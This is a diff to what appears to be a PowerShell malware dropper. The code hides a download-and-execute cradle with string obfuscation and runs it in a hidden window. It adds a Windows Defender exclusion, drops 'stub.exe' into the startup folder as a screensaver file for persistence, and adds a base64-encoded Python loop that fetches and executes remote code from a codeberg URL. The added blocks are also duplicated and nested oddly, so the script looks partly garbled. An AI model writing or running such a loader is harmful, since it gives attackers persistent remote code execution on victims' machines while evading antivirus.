@@ -74,14 +74,29 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Me
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
+if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
+    echo "hi"
+    $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+$output = "$startupfolder\Updateclient.scr"
+Add-MpPreference -ExclusionPath $output
 
+if (Test-Path -Path $output) {
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
-    Write-Host "hello"
+    $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+    $output = "$startupfolder\Updateclient.scr"
+    Add-MpPreference -ExclusionPath $output
+
+    if (Test-Path -Path $output) {
+        Write-Host "hello"
+    } else {
+        Invoke-WebRequest -Uri $url -OutFile $output
+    }
 } else {
-    Invoke-WebRequest -Uri $url -OutFile $output
+    python -c "exec(__import__('base64').b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB0aW1lCgp1cmwgPSAiaHR0cHM6Ly9jb2RlYmVyZy5vcmcvNDNhMTcyMy9oYWkxNzIzL3Jhdy9icmFuY2gvbWFpbi9hL21haW4ucHkiCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbnRlbnQgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpCiAgICAgICAgZXhlYyhjb250ZW50KQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCgzKQ=='))"
 }
+
 
